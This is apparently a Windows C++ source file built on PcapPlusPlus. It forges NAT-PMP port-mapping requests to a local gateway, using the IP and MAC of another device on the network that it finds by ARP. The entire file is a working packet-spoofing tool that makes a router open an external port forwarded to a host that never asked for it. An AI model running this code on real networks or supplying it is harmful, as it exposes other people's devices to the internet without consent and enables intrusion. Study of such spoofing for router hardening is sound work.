#pragma once
#include <stdio.h>
#include <cassert>
#include <cstddef>
#include <iostream>
#include <Assert.h>
#include <string>
#include <vector>
#include <bitset>
#include <climits>
#include <iomanip>
#include <iostream>
#include "SystemUtils.h"
#include "Packet.h"
#include "EthLayer.h"
#include "VlanLayer.h"
#include "IPv4Layer.h"
#include "TcpLayer.h"
#include "HttpLayer.h"
#include "UdpLayer.h"
#include <PayloadLayer.h>
#include <PcapFileDevice.h>
#include "PcapLiveDeviceList.h"
#include <Windows.h>
#include <Iphlpapi.h>
#include <format>
#include "SystemUtils.h"
#include "stdlib.h"


#pragma comment(lib, "wpcap" )
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "IPHLPAPI.lib")
#pragma comment(lib, "Packet.lib")
#pragma comment(lib, "Common++.lib")
#pragma comment(lib, "Packet++.lib")
#pragma comment(lib, "Pcap++.lib")
#pragma warning(disable:4996)

std::string SMAC{ "" }; //Our MAC 
std::string DMAC{ "" }; //MAC of device we will be impersonating (Optional)
std::string GWMAC{ "" }; //Gateway MAC (Optional)
std::string DADDR{ "" }; //IPv4 of device we will be impersonating 
std::string DGWAY{ "" }; //IPv4 of gateway device (Optional)
bool istcp = false;
uint16_t gwlistenerport = 5351; //Default port nat-pmp listens to
uint16_t internalport = 1025;
uint16_t externalport = 1025;
uint32_t mappinglifetime = 7200; //Recommended to be 2 hrs (https://datatracker.ietf.org/doc/html/rfc6886)

struct WinDev {
    std::string ipaddr{ "" }; //IPv4 address of an interface as as tring
    std::string gwayip{ "" }; //DGWAY as a string
    std::vector<uint8_t> macaddrvec; //MAC address of an interface
    std::uint32_t bitaddr{ 0 }; //IPv4 address as a 32bit unsigned integer
    std::uint32_t bitmask{ 0 }; //Net mask as a 32bit unsigned integer
    std::uint32_t wildcardmask{ 0 }; //bit-flip version of bitmask
    std::uint32_t netaddress{ 0 }; //IPv4 address of a network (e.g. 192.168.1.0)
    std::uint32_t broadcastaddress{ 0 }; //IPv4 broadcast address of that network (e.g. 192.168.1.255)
    unsigned long interfaceindex{ 0 }; //So we can check if interface already added and update it accordingly. Index is the same as the one you get with "netsh interface ipv4 show interfaces" command.
};
std::vector<WinDev> DEVS; //Vector, containing all our interfaces


std::string VecToString(std::vector <uint8_t> inputvec);
std::string VecToStringWithDelimiters(std::vector <uint8_t> inputvec, const char delimiter);
std::string MacVecToStringWithDelimiters(std::vector <uint8_t> inputvec, const char delimiter);
std::vector<std::string> split(std::string s, const char delimiter);
uint32_t SchizoConverter(std::string inputstring);
WinDev FindAppropriateDevice(const std::vector <WinDev> inputvec, const std::string DestIp);
int MakeMeIpv4(uint32_t input, unsigned int& a, unsigned int& b, unsigned int& c, unsigned int& d);
void PrintIPV4(const char* msg, uint32_t input);
void getDevices();
void PrintIPV42(const char* msg, uint32_t input);
void PrintIPV43(const char* msg, uint32_t input);
void sendarp(WinDev localstruct, std::string destinationv4, std::vector <uint8_t>& inputvec); //[IN] WinDev, [IN] std::string IPV4, [OUT] std::vector uint8_t
void PrintMacFromVec(const std::vector <uint8_t> inputvec);
uint8_t sendspoof(std::string lsDMAC, std::string lsGWMAC, std::string lsDADDR, WinDev Out, bool lstcp, uint16_t lsinternalport, uint16_t lsexternalport, uint16_t lsGWlistenport, uint32_t mappingtime);
const static auto MVTSWD = MacVecToStringWithDelimiters;

int main()
{

    DADDR = "192.168.1.234";//Testing purpose


    if (DMAC.empty())  //If we don't pass destination MAC, we need to get it with ARP
    {
        getDevices(); //Interfaces will be added to DEVS vector.
        WinDev OutputInterface = FindAppropriateDevice(DEVS, DADDR); //Will return WinDev object with interface from the same network
        SMAC = MacVecToStringWithDelimiters(OutputInterface.macaddrvec, ':');
        std::vector <uint8_t> targetmac;
        std::cout << std::endl << "Destination MAC not found, making an ARP request..." << std::endl;
        sendarp(OutputInterface, DADDR, targetmac);
        DMAC = MVTSWD(targetmac, ':');
        if (DGWAY.empty())
        {
            DGWAY = OutputInterface.gwayip;
            if (GWMAC.empty())
            {
                std::vector <uint8_t> gwaymacvec;
                std::cout << std::endl << "Gateway MAC not found, making an ARP request..." << std::endl;
                sendarp(OutputInterface, DGWAY, gwaymacvec);
                std::cout << std::endl;
                GWMAC = MacVecToStringWithDelimiters(gwaymacvec, ':');
            }
        }
        uint8_t pretval = sendspoof(DMAC, GWMAC, DADDR, OutputInterface, istcp, internalport, externalport, gwlistenerport, mappinglifetime);
        if (0 == pretval)
            std::cout << "Nat-PMP request sent" << std::endl;
    }
    if (DGWAY.empty())
    {
        getDevices(); //Interfaces will be added to DEVS vector.
        WinDev OutputInterface = FindAppropriateDevice(DEVS, DADDR);
        DGWAY = OutputInterface.gwayip;
        if (GWMAC.empty())
        {
            std::vector <uint8_t> gwaymacvec;
            std::cout << std::endl << "Gateway MAC not found, making an ARP request..." << std::endl;
            sendarp(OutputInterface, DGWAY, gwaymacvec);
            std::cout << std::endl;
            GWMAC = VecToString(gwaymacvec);
        }
        uint8_t pretval = sendspoof(DMAC, GWMAC, DADDR, OutputInterface, istcp, internalport, externalport, gwlistenerport, mappinglifetime);
        if (0 == pretval)
            std::cout << "Nat-PMP request sent" << std::endl;
    }
    system("PAUSE");
}

uint8_t sendspoof(std::string lsDMAC, std::string lsGWMAC, std::string lsDADDR, WinDev Out, bool lstcp, uint16_t lsinternalport, uint16_t lsexternalport, uint16_t lsGWlistenport, uint32_t mappingtime)
{
    /*    
           0                   1                   2                   3
           0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
          +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
          | Vers = 0      | OP = x        | Reserved                      |
          +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
          | Internal Port                 | Suggested External Port       |
          +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
          | Requested Port Mapping Lifetime in Seconds                    |
          +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
          (https://datatracker.ietf.org/doc/html/rfc6886)
       */

    uint8_t* lsbuffer = (uint8_t*)calloc(12, sizeof(uint8_t)); //4 bytes * 3 rows = 12
    if (lsbuffer)
    {
        lsbuffer[0] = 0; //Version

        uint8_t mappingopcode = 1;
        if (lstcp)
            mappingopcode = 2;
        lsbuffer[1] = (uint8_t(mappingopcode)); //1 for UDP and 2 for TCP. 

        //2nd and 3rd bytes are reserved
        uint8_t* ptr16t8 = (uint8_t*)(&(lsinternalport)); //Internal (host) port
        lsbuffer[4] = *(ptr16t8 + 1); //BE,MSB
        lsbuffer[5] = *ptr16t8;       //LSB

        ptr16t8 = (uint8_t*)(&(lsexternalport)); //External (GW) port
        lsbuffer[6] = *(ptr16t8 + 1); //BE,MSB
        lsbuffer[7] = *ptr16t8;       //LSB

        lsbuffer[8] = (mappingtime >> 24) & 0xFF; //Lifetime in BE, MSB   
        lsbuffer[9] = (mappingtime >> 16) & 0xFF;
        lsbuffer[10] = (mappingtime >> 8) & 0xFF;
        lsbuffer[11] = (mappingtime) & 0xFF;      //LSB

        for (int z = 0; z < 11; z++)
        {
            std::cout << std::setfill('0') << std::setw(2) << (int)lsbuffer[z] << '-';
        }
        std::cout << std::setfill('0') << std::setw(2) << (int)lsbuffer[11] << std::endl;

        pcpp::EthLayer newEthernetLayer(lsDMAC, lsGWMAC);
        pcpp::IPv4Layer newIPLayer(pcpp::IPv4Address(lsDADDR), pcpp::IPv4Address(Out.gwayip));
        newIPLayer.getIPv4Header()->timeToLive = 64;
        newIPLayer.getIPv4Header()->ipId = htons(2000);
        pcpp::UdpLayer newUdpLayer(lsinternalport, lsGWlistenport);
        pcpp::PayloadLayer newPayload(lsbuffer, 12, true);

        pcpp::Packet newPacket(100);
        newPacket.addLayer(&newEthernetLayer);
        newPacket.addLayer(&newIPLayer);
        newPacket.addLayer(&newUdpLayer);
        newPacket.addLayer(&newPayload);
        newPacket.computeCalculateFields();

        pcpp::IPv4Address testv4(Out.ipaddr);
        if (true == testv4.isValid())
        {
            pcpp::PcapLiveDevice* dev = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByIp(testv4);
            if (nullptr == dev)
                std::cout << "Couldn't find interface by provided IP address or name" << std::endl;
            if (!dev->open())
                std::cout << "!Couldn't open the device." << std::endl;
            else
            {
                int sentCount = dev->sendPacket(&newPacket);
                std::cout << sentCount << std::endl;
            }
            free(lsbuffer);
            return 0;
        }
        std::cout << "Host address didn't pass validation check. Aborting..." << std::endl;
        return 322;
    }
    std::cout << "Wasn't able to allocate memory. Aborting..." << std::endl;
    return 323;
}
void getDevices()
{
    PIP_ADAPTER_INFO AdapterInfo;
    DWORD dwBufLen = sizeof(IP_ADAPTER_INFO);

    AdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
    if (AdapterInfo == NULL)
    {
        printf("Error allocating memory needed to call GetAdaptersinfo when tried to get local interfaces\n");
    }
    else
    {
        // Make an initial call to GetAdaptersInfo to get the necessary size into the dwBufLen variable
        if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_BUFFER_OVERFLOW) {
            free(AdapterInfo);
            AdapterInfo = (IP_ADAPTER_INFO*)malloc(dwBufLen);
            if (AdapterInfo == NULL) {
                printf("Error allocating memory needed to call GetAdaptersinfo when tried to get local interfaces\n");
            }
        }

        if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == NO_ERROR) {
            // Contains pointer to current adapter info
            PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
            do {
                std::vector<uint8_t> hwaddr;
                if ('0' != pAdapterInfo->IpAddressList.IpAddress.String[0])
                {
                    for (unsigned int i = 0; i < pAdapterInfo->AddressLength; i++)
                    {
                        hwaddr.push_back((uint8_t)pAdapterInfo->Address[i]);
                    }

                    unsigned long localinterfaceindex = pAdapterInfo->Index;
                    uint32_t bitmask = SchizoConverter(pAdapterInfo->IpAddressList.IpMask.String);
                    uint32_t bitipaddr = SchizoConverter(pAdapterInfo->IpAddressList.IpAddress.String);
                    uint32_t netaddr = bitipaddr & bitmask;        //Calculate network address
                    uint32_t wildcardmask = ~bitmask;
                    uint32_t broadcastaddr = netaddr | wildcardmask;   //Calculate network broadcast address

                    bool interfaceexists = false;
                    for (int l = 0; l < DEVS.size(); l++)
                    {
                        if (localinterfaceindex == DEVS.at(l).interfaceindex)
                        {
                            interfaceexists = true; //Update interface instead
                            DEVS.at(l) = (WinDev{ std::string((char*)pAdapterInfo->IpAddressList.IpAddress.String), std::string(pAdapterInfo->GatewayList.IpAddress.String), hwaddr,bitipaddr,bitmask,wildcardmask,netaddr,broadcastaddr,localinterfaceindex });
                        }
                    }
                    if (false == interfaceexists)
                    {
                        DEVS.push_back(WinDev{ std::string((char*)pAdapterInfo->IpAddressList.IpAddress.String), std::string(pAdapterInfo->GatewayList.IpAddress.String), hwaddr,bitipaddr,bitmask,wildcardmask,netaddr,broadcastaddr,localinterfaceindex });
                    }

                }
                pAdapterInfo = pAdapterInfo->Next;
            } while (pAdapterInfo);
        }
    }
    free(AdapterInfo);
}

std::vector<std::string> split(std::string s, const char delimiter)
{
    size_t pos_start = 0, pos_end;
    std::string substr;
    std::vector<std::string> res;
    while ((pos_end = s.find(delimiter, pos_start)) != std::string::npos)
    {
        substr = s.substr(pos_start, pos_end - pos_start);
        pos_start = pos_end + 1;
        res.push_back(substr);
    }
    res.push_back(s.substr(pos_start));
    return res;
}

uint32_t SchizoConverter(std::string inputstring)
{
    std::vector<std::string> v = split(inputstring, '.');
    uint32_t retval = 0;
    for (int l = 0; l < v.size(); l++)
    {
        retval = (retval << 8) | std::stoi(v[l]);
    }
    return retval;
}

void PrintIPV4(const char* msg, uint32_t input) //Not an endianness independent code
{
    unsigned int d = input & 0xFF;
    unsigned int c = (input >> 8) & 0xFF;
    unsigned int b = (input >> 16) & 0xFF;
    unsigned int a = (input >> 24) & 0xFF;
    std::cout << msg << std::dec << a << "." << b << "." << c << "." << d << std::endl;
}

int MakeMeIpv4(uint32_t input, unsigned int& a, unsigned int& b, unsigned int& c, unsigned int& d)
{
    uint8_t* bytes = reinterpret_cast<uint8_t*>(&input);
    d = static_cast <int>(bytes[0]);
    c = static_cast <int>(bytes[1]);
    b = static_cast <int>(bytes[2]);
    a = static_cast <int>(bytes[3]);
    return 0;
}

void PrintIPV42(const char* msg, uint32_t input)
{
    uint8_t* bytes = reinterpret_cast<uint8_t*>(&input);
    unsigned int d = static_cast <int>(bytes[0]);
    unsigned int c = static_cast <int>(bytes[1]);
    unsigned int b = static_cast <int>(bytes[2]);
    unsigned int a = static_cast <int>(bytes[3]);
    std::cout << msg << std::dec << a << "." << b << "." << c << "." << d << std::endl;
}

void PrintIPV43(const char* msg, uint32_t input)
{
    uint8_t* cde = (uint8_t*)(&(input));
    unsigned int d = *cde;
    unsigned int c = *(cde + 1);
    unsigned int b = *(cde + 2);
    unsigned int a = *(cde + 3);
    std::cout << msg << std::dec << a << "." << b << "." << c << "." << d << std::endl;
}

void sendarp(const WinDev localstruct, const std::string destinationv4, std::vector <uint8_t>& inputvec) //[IN] WinDev, [IN] std::string IPV4, [OUT] std::vector uint8_t
{
    IPAddr SourceADR = inet_addr(localstruct.ipaddr.c_str());
    IPAddr DestIp = inet_addr(destinationv4.c_str());
    ULONG addrlen = localstruct.macaddrvec.size();
    ULONG MacAddr[2];
    DWORD dwRetVal = SendARP(DestIp, SourceADR, &MacAddr, &addrlen);
    BYTE* bPhysAddr;
    if (dwRetVal == NO_ERROR)
    {
        bPhysAddr = (BYTE*)&MacAddr;
        if (addrlen)
        {
            std::cout << "Made an ARP request for " << destinationv4 << ", MAC address in the response is ";
            unsigned int id = ((int)addrlen - 1);
            for (unsigned int i = 0; i < id; i++)
            {
                inputvec.push_back((uint8_t)bPhysAddr[i]);
                std::cout << std::setfill('0') << std::setw(2) << std::hex << (int)bPhysAddr[i] << ":";
            }
            inputvec.push_back((uint8_t)bPhysAddr[id]);
            std::cout << std::setfill('0') << std::setw(2) << std::hex << (int)bPhysAddr[id] << std::endl;
        }
        else
            printf("Warning: SendArp completed successfully, but returned length=0\n");
    }
    else
    {
        printf("Error: SendArp failed with error: %d", dwRetVal);
        switch (dwRetVal)
        {
        case ERROR_GEN_FAILURE:
            printf(" (ERROR_GEN_FAILURE)\n");
            break;
        case ERROR_INVALID_PARAMETER:
            printf(" (ERROR_INVALID_PARAMETER)\n");
            break;
        case ERROR_INVALID_USER_BUFFER:
            printf(" (ERROR_INVALID_USER_BUFFER)\n");
            break;
        case ERROR_BAD_NET_NAME:
            printf(" (ERROR_GEN_FAILURE)\n");
            break;
        case ERROR_BUFFER_OVERFLOW:
            printf(" (ERROR_BUFFER_OVERFLOW)\n");
            break;
        case ERROR_NOT_FOUND:
            printf(" (ERROR_NOT_FOUND)\n");
            break;
        default:
            printf("\n");
            break;
        }
    }
}

void PrintMacFromVec(const std::vector <uint8_t> inputvec)
{
    unsigned int k = (inputvec.size() - 1);
    for (unsigned int i = 0; i < k; i++)
    {
        std::cout << std::setfill('0') << std::setw(2) << std::hex << (int)inputvec.at(i) << ":";
    }
    std::cout << std::setfill('0') << std::setw(2) << std::hex << (int)inputvec.at(k) << std::endl;
}

WinDev FindAppropriateDevice(const std::vector <WinDev> inputvec, const std::string DestIp)
{
    uint32_t reformatedDestIP = SchizoConverter(DestIp);
    for (int i = 0; i < inputvec.size(); i++)
    {
        if ((inputvec[i].bitmask & reformatedDestIP) == inputvec[i].netaddress)
        {
            std::cout << std::endl << "Found appropriate interface at index=" << inputvec[i].interfaceindex << std::endl;
            return inputvec[i];
        }
    }
    return { "", "", {NULL},0,0,0,0,0 }; //We probably should use default GW if interface wasn't found
}

std::string VecToString(std::vector <uint8_t> inputvec)
{
    std::string retval;
    for (int i = 0; i < inputvec.size(); i++)
    {
        retval += inputvec.at(i);

    }
    return retval;
}

std::string VecToStringWithDelimiters(std::vector <uint8_t> inputvec, const char delimiter)
{
    std::string retval;
    for (int i = 0; i < (inputvec.size() - 1); i++)
    {
        retval += std::to_string(inputvec.at(i));
        retval += delimiter;
    }
    retval += std::to_string(inputvec.at(inputvec.size() - 1));
    return retval;
}
const auto VTSWD = VecToStringWithDelimiters;

std::string MacVecToStringWithDelimiters(std::vector <uint8_t> inputvec, const char delimiter)
{
    std::string retval;
    for (int i = 0; i < (inputvec.size() - 1); i++)
    {
        retval += std::format("{:x}", inputvec.at(i));
        retval += delimiter;
    }
    retval += std::format("{:x}", inputvec.at(inputvec.size() - 1));
    return retval;
}
